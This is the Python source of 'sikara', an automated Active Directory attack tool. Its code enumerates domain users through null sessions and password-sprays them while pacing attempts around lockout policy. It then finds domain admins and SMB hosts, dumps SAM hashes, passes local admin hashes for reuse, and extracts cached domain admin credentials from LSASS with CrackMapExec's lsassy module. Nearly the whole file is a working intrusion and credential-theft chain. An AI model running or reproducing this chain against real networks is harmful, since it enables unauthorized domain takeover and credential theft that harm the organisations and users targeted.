#!/usr/bin/python3
# -*- coding: utf-8 -*-
# by @thexon
# Version 1.2

# needs rpcclient, smbclient, ldapsearch, polenum, nmap and latest stable version of cme (alias cme and not crackmapexec)

from subprocess import call, DEVNULL, PIPE, run, check_output
from rich.console import Console
from os import path
from select import select
from shutil import which
import sys, ipaddress, time, optparse, re

console = Console()
sikaraPath = path.dirname(__file__) + '/'

class Error(Exception):
	pass
class EnumError(Error):
	pass


## Checks if required tools are available
def checkTools():

	try:
		console.print("[bold yellow] ░ Checking tools requirement...[/bold yellow]")
		tools = ["rpcclient", "smbclient", "ldapsearch", "polenum", "nmap"]
		
		for tool in tools:
			if not which(tool):
				console.print("[bold red]   [-][/bold red] It seems that [b]%s[/b] is not installed (or not in the path) but required. Exiting...\n" % tool)
				raise SystemExit
		
		# checks if lsassy module is available on cme
		cmd = run("cme smb -M lsassy", stderr=DEVNULL, stdout=DEVNULL, shell=True)
		if cmd.returncode == 1:
			console.print("[bold red]   [-][/bold red] It seems that [b]lsassy module in CME[/b] is not installed but required. Exiting...\n")
			raise SystemExit

	except SystemExit:
		sys.exit(1)
		raise
	except:
		console.print("\n[bold red]   [-][/bold red] Unexpected error: " + str(sys.exc_info()[0]) + '\n')
		sys.exit(1)
		raise


## Creates a new dir for the target domain and defines the path
def createDir(domain):

	global sikaraPath

	try:
		
		if not path.exists(sikaraPath+domain):
			console.print("\n[bold yellow] ░ Creating new directory for target domain...[/bold yellow]")
			cmd = "mkdir {}".format(sikaraPath+domain)
			call(cmd, shell=True, stdout=DEVNULL, stderr=DEVNULL)

		sikaraPath += "{}/".format(domain)

	except KeyboardInterrupt:
		console.print("\n[bold red]   [-][/bold red] User aborted.\n")
		sys.exit(1)
		raise
	except:
		console.print("\n[bold red]   [-][/bold red] Unexpected error: " + str(sys.exc_info()[0]) + '\n')
		sys.exit(1)
		raise


## Checks if NULL session is allowed on the DC with rpcclient and 
## gathers all users inside users.txt file for further pass spray.
def enumUser(dc_ip):

	global sikaraPath

	try:
		# Uses rpcclient to check for SMB NULL session and create a users.txt file
		cmd1 = "rpcclient -W '' -c enumdomusers -U''%'' {} >> {}tmp.txt".format(dc_ip, sikaraPath)
		cmd2 = "cat {}tmp.txt | grep -oP '(?<=user:\\[)[^\\]]*' > {}users.txt".format(sikaraPath,sikaraPath)
		cmd3 = "rm {}tmp.txt".format(sikaraPath)

		console.print("\n[bold yellow] ░ Enumerating AD users...[/bold yellow]")

		call(cmd1, shell=True, stdout=DEVNULL, stderr=DEVNULL)

		# Checks if NULL session is allowed on the DC by reading the first line of tmp.txt.
		with open(sikaraPath+'tmp.txt', 'r') as infile:
			status = infile.readline()
			if "NT_STATUS_CONNECTION_REFUSED" in status or "NT_STATUS_ACCESS_DENIED" in status:
				call(cmd3, shell=True, stdout=DEVNULL, stderr=DEVNULL)
				console.print("[bold red]   [-][/bold red] Anonymous enumeration does not seem to work.\n")
				return False 

		console.print("[b][green]   [+][/green] It looks like NULL session is allowed on the DC.[/b]")

		# Creates users.txt file with all AD users if allowed.
		call(cmd2, shell=True, stdout=DEVNULL, stderr=DEVNULL)
		call(cmd3, shell=True, stdout=DEVNULL, stderr=DEVNULL)
		console.print("[cyan]   [*][/cyan] [i]Active Directory users were gathered in users.txt.[/i]")

		return True

	except KeyboardInterrupt:
		console.print("\n[bold red]   [-][/bold red] User aborted.\n")
		sys.exit(1)
		raise
	except:
		console.print("\n[bold red]   [-][/bold red] Unexpected error: " + str(sys.exc_info()[0]) + '\n')
		sys.exit(1)
		raise


## Escapes quotes, $ and ! for bash/shell command
def escapeshell(s):
	return s.replace('"','\\"').replace('$','\\$').replace('!','\\!')


## Takes a users file as input and tries to authenticate with 
## login as password (all lowered).
def passSprayLoginPass(dc_ip, file, domain):

	try : 
		users = []
		with open(file) as usersFile:
			users = usersFile.read().splitlines()

		console.print("\n[bold yellow] ░ Password spraying with login as password...[/bold yellow]")

		# Tries to authenticate with smbclient on the DC
		foundUserFlag = 0
		validUsers = dict()
		for user in users:
			password = user.lower()
			cmd = run('smbclient //{}/NETLOGON -U "{}\\{}%{}" -c exit'.format(dc_ip, domain, escapeshell(user), escapeshell(user)), stderr=DEVNULL, stdout=DEVNULL, shell=True)
			time.sleep(0.1) # to prevent errors

			if cmd.returncode == 0:
				if not foundUserFlag:
					console.print("[b][green]   [+][/green] Found valid account(s) using login as password:[/b]")
					foundUserFlag = 1
				validUsers[user] = user
				console.print('         [blue]->[/blue] %s' % user)

		if not foundUserFlag:
			console.print("[bold red]   [-][/bold red] No valid account was found using login as password. Try a password spray with -p option.\n")

		return validUsers

	except KeyboardInterrupt:
		console.print("\n[bold red]   [-][/bold red] User aborted.\n")
		sys.exit(1)
		raise
	except:
		console.print("\n[bold red]   [-][/bold red] Unexpected error: " + str(sys.exc_info()[0]) + '\n')
		sys.exit(1)
		raise


## Takes a users file as input and tries to authenticate with 
## a given password.
def passSprayDictPass(dc_ip, password, file, domain):

	try : 
		users = []
		with open(file) as usersFile:
			users = usersFile.read().splitlines()

		console.print("\n[bold yellow] ░ Password spraying with password [blue]%s[/blue]...[/bold yellow]" % password)
		
		# Tries to authenticate with smbclient on the DC
		foundUserFlag = 0
		validUsers = dict()
		for user in users:        	
			cmd = run('smbclient //{}/NETLOGON -U "{}\\{}%{}" -c exit'.format(dc_ip, domain, escapeshell(user), escapeshell(password)), stderr=DEVNULL, stdout=DEVNULL, shell=True)
			time.sleep(0.1) # to prevent errors

			if cmd.returncode == 0:
				if not foundUserFlag:
					console.print("[b][green]   [+][/green] Found valid account(s) using password [blue]%s[/blue]:[/b]" % password)
					foundUserFlag = 1
				validUsers[user] = password
				console.print('         [blue]->[/blue] %s' % user)

		if not foundUserFlag:
			console.print("[bold red]   [-][/bold red] No valid account was found using password [blue]%s[/blue].\n" % password)

		return validUsers

	except KeyboardInterrupt:
		console.print("\n[bold red]   [-][/bold red] User aborted.\n")
		sys.exit(1)
		raise
	except:
		console.print("[bold red]   [-][/bold red] Unexpected error: " + str(sys.exc_info()[0]) + '\n')
		sys.exit(1)
		raise


## If no SMB targets are given to Sikara, it attempts to find
## smb targets on the DC subnet /24.
def findSMBTargets(subnet):

	global sikaraPath

	try:
		console.print("\n[bold yellow] ░ Finding SMB targets on subnet [blue]%s[/blue]...[/bold yellow]" % subnet)
		# cannot use .format() because awk brackets are in conflict...
		command = "nmap -p445 -T4 --open %s -oG - | grep '/open' | awk '{ print $2 }' > %stargets.txt" % (subnet,sikaraPath)
		cmd = run(command, encoding='utf-8', stderr=DEVNULL, stdout=DEVNULL, shell=True)
		console.print("[cyan]   [*][/cyan] [i]SMB hosts were gathered in targets.txt.[/i]")

	except KeyboardInterrupt:
		console.print("\n[bold red]   [-][/bold red] User aborted.\n")
		sys.exit(1)
		raise
	except:
		console.print("\n[bold red]   [-][/bold red] Unexpected error: " + str(sys.exc_info()[0]) + '\n')
		sys.exit(1)
		raise


## Finds domain name
def findDomainName(dc_ip):

	try:
		console.print("\n[bold yellow] ░ Finding domain name...[/bold yellow]")
		cmd = run("cme smb {} | grep -oP '(?<=domain:)[^)]*'".format(dc_ip), encoding='utf-8', stderr=DEVNULL, stdout=PIPE, shell=True)
		domain = cmd.stdout.strip()
		
		if domain:
			console.print("[b][green]   [+][/green] Found domain name [blue]{}[/blue].[/b]".format(domain))
			return domain

		console.print("[bold red]   [-][/bold red] Failed to retrieve domain name.")
		return None

	except KeyboardInterrupt:
		console.print("\n[bold red]   [-][/bold red] User aborted.\n")
		sys.exit(1)
		raise
	except:
		console.print("\n[bold red]   [-][/bold red] Unexpected error: " + str(sys.exc_info()[0]) + '\n')
		sys.exit(1)
		raise


## Finds domain account lockout policy
def findDomainLockoutPolicy(dc_ip):

	try:
		lockoutPolicy = dict()
		console.print("\n[bold yellow] ░ Finding domain account lockout policy (FGPP check later on)...[/bold yellow]")
		cmd = run("polenum '':''@{} | grep Lock".format(dc_ip), encoding='utf-8', stderr=DEVNULL, stdout=PIPE, shell=True)
		tmpPolicy = cmd.stdout.strip().split('\n')

		if tmpPolicy[0]:
			for item in tmpPolicy:
				if "Reset Account Lockout Counter" in item: lockoutPolicy['window'] = item.split(': ')[1].split(' ')[0]
				if "Locked Account Duration" in item: lockoutPolicy['lockout'] = item.split(': ')[1].split(' ')[0]
				if "Account Lockout Threshold" in item: 
					if item.split(': ')[1] == "None": lockoutPolicy['attempts'] = "Infinite"
					else: lockoutPolicy['attempts'] = item.split(': ')[1]

			console.print("[b][green]   [+][/green] [blue]{}[/blue] failed attempts within [blue]{} minutes[/blue] lead to a [blue]{} minutes[/blue] lockout.[/b]".format(lockoutPolicy['attempts'], lockoutPolicy['window'], lockoutPolicy['lockout']))
			return lockoutPolicy

		console.print("[bold red]   [-][/bold red] Failed to retrieve domain account lockout policy.")
		return None

	except KeyboardInterrupt:
		console.print("\n[bold red]   [-][/bold red] User aborted.\n")
		sys.exit(1)
		raise
	except:
		console.print("\n[bold red]   [-][/bold red] Unexpected error: " + str(sys.exc_info()[0]) + '\n')
		sys.exit(1)
		raise


## Checks if password spray counter is near the password policy limit and asks for continuing
def checkPasswordSprayCounter(lockoutPolicy):

	global sikaraPath

	try:
		console.print("\n[bold yellow] ░ Checking previous password sprays...[/bold yellow]")

		with open(sikaraPath+'try.lock', 'r') as infile:
			timestamps = reversed(infile.readlines())

			counter = 0
			actualTimestamp = time.time()
			window = lockoutPolicy['window']

			for timestamp in timestamps:
				if actualTimestamp - float(timestamp.strip()) < 60 * int(window): counter += 1
				else: break

		console.print("[bold yellow]   [!][/bold yellow] Already done [blue]%s[/blue] password spray in the last [blue]%s[/blue] minutes. Be careful not locking out all domain accounts." % (counter, lockoutPolicy['window']))
		console.print("[b][yellow]   [!][/yellow] Press [Enter] to proceed to password spray.[/b]")
		
		timeout = 10
		keyPressed, a, b = select([sys.stdin], [], [], timeout)
		if not keyPressed:
			console.print("\n[b][red]   [-][/red] No key pressed. Exiting...[/b]\n")
			raise SystemExit

	except SystemExit:
		sys.exit(1)
		raise
	except KeyboardInterrupt:
		console.print("\n[bold red]   [-][/bold red] User aborted.\n")
		sys.exit(1)
		raise
	except FileNotFoundError:
		console.print("[bold red]   [-][/bold red] Timestamp file try.lock not found. Assuming this is the first use of the tool.")
	except:
		console.print("\n[bold red]   [-][/bold red] Unexpected error: " + str(sys.exc_info()[0]) + '\n')
		sys.exit(1)
		raise


## Increments password spray counter in try.lock	
def timestampPasswordSpray():

	global sikaraPath

	try:
		with open(sikaraPath+'try.lock', 'a') as infile:
			infile.write("{}\n".format(time.time()))

	except KeyboardInterrupt:
		console.print("\n[bold red]   [-][/bold red] User aborted.\n")
		sys.exit(1)
		raise
	except:
		console.print("\n[bold red]   [-][/bold red] Unexpected error: " + str(sys.exc_info()[0]) + '\n')
		sys.exit(1)
		raise


## Finds domain fine grained password policy if any. It requires
## an account so it will be displayed after the previous password
## sprays. But it can be useful for further password sprays.
def findFGPP(dc_ip, validUsers, domain):

	global sikaraPath

	try:
		console.print("\n[bold yellow] ░ Finding Fine Grained Password Policy for further password sprays...[/bold yellow]")
		
		user, password = next(iter(validUsers.keys())), next(iter(validUsers.values()))

		# Forms domain base
		if '.' in domain:
			domainArray = domain.strip().split('.')
			domainBase = ''
			for part in domainArray:
				domainBase += "DC={},".format(part)
			domainBase = domainBase[:-1]
		else:
			domainBase = domain

		# search for the fgpp container
		objectFilter = "(objectClass=msDS-PasswordSettings)"
		command = 'ldapsearch -x -H ldap://{} -D {}@{} -w {} -b "{}" "{}" | grep numEntries'.format(dc_ip,user,domain,password,domainBase,objectFilter)
		cmd = run(command, encoding='utf-8', stderr=DEVNULL, stdout=PIPE, shell=True)
		numEntries = cmd.stdout.strip().split('\n')

		# Checks if "# numEntries:" is different from 0, meaning that there is a FGPP entry
		if numEntries[0]:

			command2 = 'ldapsearch -x -H ldap://{} -D {}@{} -w {} -b "{}" "{}" msDS-LockoutObservationWindow msDS-LockoutDuration msDS-LockoutThreshold | grep msDS-Lockout'.format(dc_ip,user,domain,password,domainBase,objectFilter)
			cmd2 = run(command2, encoding='utf-8', stderr=DEVNULL, stdout=PIPE, shell=True)
			fgppParameters = cmd2.stdout.strip().split('\n')[1:]

			fgpp = dict()
			for param in fgppParameters:
				if "msDS-LockoutObservationWindow" in param: fgpp['window'] = str(int(param.split(': ')[1][1:]) // 60000) 
				if "msDS-LockoutDuration" in param: fgpp['lockout'] = str(int(param.split(': ')[1][1:]) // 60000)
				if "msDS-LockoutThreshold" in param: fgpp['attempts'] = param.split(': ')[1]

			# if threshold is 0, then there is no FGPP to be taken into account
			if fgpp['attempts'] != "0":
				
				console.print("[b][green]   [+][/green] FGPP detected and taken into account for further password sprays.[/b]")
				console.print("[b][green]   [+][/green] [blue]{}[/blue] failed attempts within [blue]{} minutes[/blue] lead to a [blue]{} minutes[/blue] lockout.[/b]".format(fgpp['attempts'], fgpp['window'], fgpp['lockout']))

				with open(sikaraPath+'fgpp.lock', 'w') as fgppFile:
					fgppFile.write("{} / {} / {}".format(fgpp['attempts'], fgpp['window'], fgpp['lockout']))

				return

		console.print("[bold red]   [-][/bold red] No FGPP was found on the domain.")

	except KeyboardInterrupt:
		console.print("\n[bold red]   [-][/bold red] User aborted.\n")
		sys.exit(1)
		raise
	except:
		console.print("\n[bold red]   [-][/bold red] Unexpected error: " + str(sys.exc_info()[0]) + '\n')
		sys.exit(1)
		raise


## Finds domain admins
def findDomainAdmins(dc_ip, validUsers, domain):

	try:
		console.print("\n[bold yellow] ░ Finding domain admins...[/bold yellow]")
		
		user, password = next(iter(validUsers.keys())), next(iter(validUsers.values()))

		# Forms domain base
		if '.' in domain:
			domainArray = domain.strip().split('.')
			domainBase = ''
			for part in domainArray:
				domainBase += "DC={},".format(part)
			domainBase = domainBase[:-1]
		else:
			domainBase = domain

		# deals with different names
		domainAdminGroups = ["Domain Admins", "Admins du domaine", "Domain Administrators"]

		for domainAdminGroup in domainAdminGroups:

			# recursively search for nested DA groups
			objectFilter = "(&(objectClass=user)(memberof:1.2.840.113556.1.4.1941:=CN={},CN=Users,{}))".format(domainAdminGroup, domainBase)
			command = 'ldapsearch -x -H ldap://{} -D {}@{} -w {} -b "{}" "{}" | grep sAMAccountName | cut -d " " -f2'.format(dc_ip,user,domain,password,domainBase,objectFilter)
			cmd = run(command, encoding='utf-8', stderr=DEVNULL, stdout=PIPE, shell=True)
			domainAdmins = cmd.stdout.strip().split('\n')
		
			if domainAdmins[0]:

				console.print("[b][green]   [+][/green] Found [blue]%s[/blue] domain admins.[/b]" % len(domainAdmins))
				for admin in domainAdmins:
					console.print('         [blue]->[/blue] {}'.format(admin))
				return domainAdmins

		console.print("[bold red]   [-][/bold red] Failed to retrieve domain admins.")
		return None

	except KeyboardInterrupt:
		console.print("\n[bold red]   [-][/bold red] User aborted.\n")
		sys.exit(1)
		raise
	except:
		console.print("\n[bold red]   [-][/bold red] Unexpected error: " + str(sys.exc_info()[0]) + '\n')
		sys.exit(1)
		raise


## Checks if user is member of domain admins 
def isDomainAdmin(user, domainAdmins, domain):

	try:
		if user in domainAdmins:
			console.print("\n[b][green]   [+][/green] User [blue]%s[/blue] is a domain administrator. Well done, domain [blue]%s[/blue] is pwned, have fun ![/b]\n" % (user,domain))
			return True
		return False

	except KeyboardInterrupt:
		console.print("\n[bold red]   [-][/bold red] User aborted.\n")
		sys.exit(1)
		raise
	except:
		console.print("\n[bold red]   [-][/bold red] Unexpected error: " + str(sys.exc_info()[0]) + '\n')
		sys.exit(1)
		raise


## Finds admin rights on SMB hosts with previously found valid users 
def findLocalAdminRights(validUsers, targetsFile, domain):
	
	try:
		console.print("\n[bold yellow] ░ Hunting for admin rights on targets with previous valid users...[/bold yellow]")
		
		for user in validUsers:
			
			cmd = run("cme smb %s -u %s -p %s -d %s | grep Pwn3d | awk '{print $2}'" % (targetsFile,user,validUsers[user],domain), encoding='utf-8', stderr=DEVNULL, stdout=PIPE, shell=True)
			localAdminMachines = cmd.stdout.strip().split('\n')

			if localAdminMachines[0]:

				console.print("[b][green]   [+][/green] Found admin rights for user [blue]%s[/blue] on [blue]%i[/blue] machines.[/b]" % (user,len(localAdminMachines)))
				console.print("[cyan]   [*][/cyan] [i]Admin rights enumeration for other users stopped.[/i]")
				localAdminRights = {'user':user, 'password':validUsers[user], 'domain':domain, 'hosts':localAdminMachines}
				return localAdminRights

		console.print("[bold red]   [-][/bold red] No admin right was found on targets with these users.\n")

	except KeyboardInterrupt:
		console.print("\n[bold red]   [-][/bold red] User aborted.\n")
		sys.exit(1)
		raise
	except:
		console.print("\n[bold red]   [-][/bold red] Unexpected error: " + str(sys.exc_info()[0]) + '\n')
		sys.exit(1)
		raise


## Dumps SAM database for user having admin rights on SMB host
def dumpSAM(localAdminRights):

	global sikaraPath

	try:
		user, password, domain, hosts = localAdminRights['user'], localAdminRights['password'], localAdminRights['domain'], localAdminRights['hosts'] 
		console.print("\n[bold yellow] ░ Retrieving Administrator hashes in SAM database of compromised hosts...[/bold yellow]")

		localAdminHashes = []

		# Dumps SAM of each host on which user has admin rights
		for host in hosts:

			cmd = run("cme smb %s -u %s -p %s -d %s --sam | grep ':500:' | awk '{print $5}' | grep -oP '(?<=33m).*'" % (host,user,password,domain), encoding='utf-8', stderr=DEVNULL, stdout=PIPE, shell=True)
			localAdminHash = cmd.stdout.split(':::')[0].split(':500:')

			# To prevent duplicates			
			if localAdminHash not in localAdminHashes:
				localAdminHashes.append(localAdminHash)

		hashesCount = len(localAdminHashes)
		if hashesCount >= 1:
			console.print("[b][green]   [+][/green] Retrieved [blue]%i[/blue] different local administrator accounts credentials.[/b]" % hashesCount)
			
			with open(sikaraPath+'localAdminHash.txt', 'w') as outfile:
				for localAdminHash in localAdminHashes:
					outfile.write(localAdminHash[0]+':'+localAdminHash[1]+'\n')

			console.print("[cyan]   [*][/cyan] [i]Credentials were gathered in localAdminHash.txt.[/i]")
			return localAdminHashes

		else:
			console.print("[bold red]   [-][/bold red] Could not retrieve local administrator account credentials.\n")
			return localAdminHashes

	except KeyboardInterrupt:
		console.print("\n[bold red]   [-][/bold red] User aborted.\n")
		sys.exit(1)
		raise
	except:
		console.print("\n[bold red]   [-][/bold red] Unexpected error: " + str(sys.exc_info()[0]) + '\n')
		sys.exit(1)
		raise


## Tries to pass the admin hash over every SMB hosts
def localAdminPassReuse(localAdminHashes, targetsFile):

	try:
		console.print("\n[bold yellow] ░ Hunting for local administrator password reuse...[/bold yellow]")

		localAdminHashesReused = []

		# For each admin hash previously found, tries to find other machines on which the same password is used.
		for localAdminHash in localAdminHashes:

			cmd = run("cme smb %s -u %s -H %s --local-auth | grep Pwn3d | awk '{print $2}'" % (targetsFile,localAdminHash[0],localAdminHash[1]), encoding='utf-8', stderr=DEVNULL, stdout=PIPE, shell=True)
			passReuseMachines = cmd.stdout.strip().split('\n')
			passReuseCount = len(passReuseMachines)

			if passReuseMachines[0]:
				
				# If it is used on more than 1 machine
				if passReuseCount > 1:
					console.print("[b][green]   [+][/green] [blue]%s:%s[/blue] is valid on [blue]%i[/blue] machines:[/b]" % (localAdminHash[0],localAdminHash[1],passReuseCount))
					for machine in passReuseMachines: console.print('         [blue]->[/blue] %s' % machine)
				else:
					console.print("[bold orange]   [!][/bold orange] [blue]%s:%s[/blue] is only valid on [blue]%i[/blue].\n" % (localAdminHash[0],localAdminHash[1],passReuseMachines[0]))

				currentHash = dict()
				currentHash['login'], currentHash['hash'], currentHash['reuseCount'], currentHash['reuseMachines'] = localAdminHash[0], localAdminHash[1], passReuseCount, passReuseMachines
				localAdminHashesReused.append(currentHash)

			else:
				console.print("[bold red]   [-][/bold red] Error while using hash of [blue]%s[/blue] on targets. Maybe local administrator account is disabled or password must be changed or UAC is blocking.\n" % localAdminHash[0])
				return localAdminHashesReused	

		# Sorts the admin hashes being reused by the number of actual reuse (first hash being the one that is most reused on targets)
		localAdminHashesReused = sorted(localAdminHashesReused, key=lambda k: k['reuseCount'])
		return localAdminHashesReused

	except KeyboardInterrupt:
		console.print("\n[bold red]   [-][/bold red] User aborted.\n")
		sys.exit(1)
		raise
	except:
		console.print("\n[bold red]   [-][/bold red] Unexpected error: {} \n".format(str(sys.exc_info()[0])))
		sys.exit(1)
		raise


## Dumps LSA cache of compromised hosts to search for DA credentials
def dumpLSA(localAdminHashesReused, domainAdmins, domain):

	global sikaraPath

	try:
		console.print("\n[bold yellow] ░ Hunting for cached domain admins credentials...[/bold yellow]")
		domainPwned = False

		for localAdminHashReused in localAdminHashesReused:

			login, localAdminHash, reuseMachines = localAdminHashReused['login'], localAdminHashReused['hash'], localAdminHashReused['reuseMachines']
			
			domainAdminHashes = []

			for machine in reuseMachines:

				command = "cme smb %s -u %s -H %s --local-auth -M lsassy | grep LSASSY| awk '{print $5 \":\" $6}'" % (machine,login,localAdminHash)
				cmd = run(command, encoding='utf-8', stderr=DEVNULL, stdout=PIPE, shell=True)
				lsassyHashes = cmd.stdout.strip().split('\n')

				for lsassyHash in lsassyHashes:
					account = lsassyHash.replace('\\',' ').replace(':',' ').split(' ')[1]
					if account in domainAdmins:
						domainPwned = True
						lsassyHash = lsassyHash[9:-3]

						if lsassyHash not in domainAdminHashes:
							domainAdminHashes.append(lsassyHash)
							console.print("[b][green]   [+][/green] Retrieved [blue]{}[/blue] credentials on [blue]{}[/blue] ![/b]".format(account,machine))
							console.print("[b][green]   [+][/green] [blue]{}[/blue][/b]".format(lsassyHash))

							with open(sikaraPath+'domainAdminHash.txt', 'a') as outfile:
								outfile.write(lsassyHash+'\n')

		if domainPwned:
			console.print("[cyan]   [*][/cyan] [i]Domain admin credentials were gathered in domainAdminHash.txt.[/i]")
			console.print("[b][green]   [+][/green] Well done, domain [blue]{}[/blue] is pwned, have fun ![/b]\n".format(domain))
		else:
			console.print("[bold red]   [-][/bold red] Could not retrieve any cached domain admin credentials.\n")				

	except KeyboardInterrupt:
		console.print("\n[bold red]   [-][/bold red] User aborted.\n")
		sys.exit(1)
		raise
	except:
		console.print("\n[bold red]   [-][/bold red] Unexpected error: {}\n".format(sys.exc_info()[0]))
		sys.exit(1)
		raise


## Mind blowing banner rendering
def banner():
	banner = "\n".join([
		'[b][yellow]',
		'                  _ _                   ',
		'              ___(_) | ____ _ _ __ __ _ ',
		'             / __| | |/ / _` | \'__/ _` |',
		'             \\__ \\ |   < (_| | | | (_| |',
		'             |___/_|_|\\_\\__,_|_|  \\__,_|',
		'[/yellow]',
		'             ░ Active Directory Hunting[/b]',
		'                    ░ by [blue]@thexon[/blue]\n\n'
	])

	console.print(banner)


## Makes the magic happen.
def main():

	global sikaraPath

	try:
		banner()

		usage = sys.argv[0] + ' [options] dc_ip'
		parser = optparse.OptionParser(usage=usage)
		parser.add_option('-u', action="store", help="File containing the list of users if automatic users enumeration failed.", dest="users", default=None)
		parser.add_option('-p', action="store", help="Password to test for password spray. Default: test login as password.", dest="password", default=None)
		parser.add_option('-d', action="store", help="Domain name if different from default domain on DC.", dest="domain", default=None)
		parser.add_option('-t', action="store", help="Subnet to target when enumerating user's rights on machines. Default: subnet /24 of the DC.", dest="targets", default=None)
		parser.add_option('-f', action="store", help="File containing targets to enumerate user's rights on machines (one per line). Default: subnet /24 of the DC.", dest="targetsFile", default=None)
		options, args = parser.parse_args()

		if len(args) != 1: raise IndexError

		# Checks if DC IP is a valid IPv4 address
		dc_ip = str(ipaddress.ip_address(args[0]))

		# Checks if required tools are available
		checkTools()

		# Finds domain name
		if options.domain:
			domain = options.domain
			console.print("\n[bold yellow] ░ Using domain [blue]%s[/blue]...[/bold yellow]" % domain)
		else: domain = findDomainName(dc_ip)

		# Creates directory for all outputs
		createDir(domain)

		# If users file is given, checks its validity and goes to password spray. Else tries to anonymously enumerate users over RPC.
		if options.users:
			if path.exists(options.users):
				usersFile = options.users
				console.print("\n[bold yellow] ░ Using file [blue]%s[/blue] for AD users...[/bold yellow]" % usersFile)
			else: raise FileNotFoundError
		elif enumUser(dc_ip):
			usersFile = sikaraPath+'users.txt'
		else:
			usersFile = sikaraPath+'../common_users.txt'
			console.print("[bold yellow] ░ Using file [blue]%s[/blue] to find potential valid users...[/bold yellow]" % usersFile)

		# Checks if FGPP has already been searched before
		if path.exists(sikaraPath+'fgpp.lock'):

			fgpp = dict()
			with open(sikaraPath+'fgpp.lock', 'r') as fgppFile:
				for line in fgppFile:
					fgpp['attempts'] = line.strip().split(' / ')[0]
					fgpp['window'] = line.strip().split(' / ')[1]
					fgpp['lockout'] = line.strip().split(' / ')[2]

			lockoutPolicy = fgpp

			console.print("\n[bold yellow] ░ Previous Fine Grained Password Policy found last time...[/bold yellow]")
			console.print("[b][green]   [+][/green] [blue]%s[/blue] failed attempts within [blue]%s minutes[/blue] lead to a [blue]%s minutes[/blue] lockout.[/b]" % (fgpp['attempts'], fgpp['window'], fgpp['lockout']))


		else:
			# Finds domain password policy
			lockoutPolicy = findDomainLockoutPolicy(dc_ip)

		# Checks if previous password spray has been done
		if lockoutPolicy: checkPasswordSprayCounter(lockoutPolicy)

		# If a password is given, does a password spray with it. Else tries login as password.
		if options.password: validUsers = passSprayDictPass(dc_ip, options.password, usersFile, domain)
		else: validUsers = passSprayLoginPass(dc_ip, usersFile, domain)
		timestampPasswordSpray()

		if validUsers:

			# Finds FGPP for further password sprays, if not already done
			if not path.exists(sikaraPath+'fgpp.lock'):
				findFGPP(dc_ip, validUsers, domain)

			# Finds domain admins
			domainAdmins = findDomainAdmins(dc_ip, validUsers, domain)

			# Checks if users that were found are part of domain admins
			if domainAdmins:
				for user in validUsers.keys():
					if isDomainAdmin(user, domainAdmins, domain): return

			# If no target is given, finds SMB targets on the DC's subnet.
			if options.targetsFile:
				if path.exists(options.targetsFile):
					targetsFile = options.targetsFile
					console.print("\n[bold yellow] ░ Using file [blue]%s[/blue] for targets...[/bold yellow]" % targetsFile)
				else: raise FileNotFoundError
			elif options.targets:
				if ipaddress.ip_network(options.targets):
					findSMBTargets(str(ipaddress.ip_network(options.targets)))
					targetsFile = sikaraPath+'targets.txt'
			else: 
				findSMBTargets(dc_ip + '/24')
				targetsFile = sikaraPath+'targets.txt'

			# If valid users were found, tries to find administrative rights on targets.
			localAdminRights = findLocalAdminRights(validUsers, targetsFile, domain)

			if localAdminRights:
				
				# If admin rights were found, tries to dump the SAM database.
				localAdminHashes = dumpSAM(localAdminRights)

				if localAdminHashes:
					
					# If local admin hash was found, tries to find password reuse on targets
					localAdminHashesReused = localAdminPassReuse(localAdminHashes, targetsFile)

					if localAdminHashesReused:

						# If local admin hash is reused on targets, dumps LSA cache to find cached domain admin credentials
						dumpLSA(localAdminHashesReused, domainAdmins, domain)


	except IndexError:
		parser.print_help()
		sys.exit(1)
	except FileNotFoundError:
		console.print("[b][red] [-][/red] The file you have provided does not seem to be valid.[/b]\n")
	except ValueError as ValErr:
		console.print("[b][red] [-][/red] The IP address you have provided does not seem to be valid.[/b]\n")
		sys.exit(1)


if __name__ == '__main__':
	main()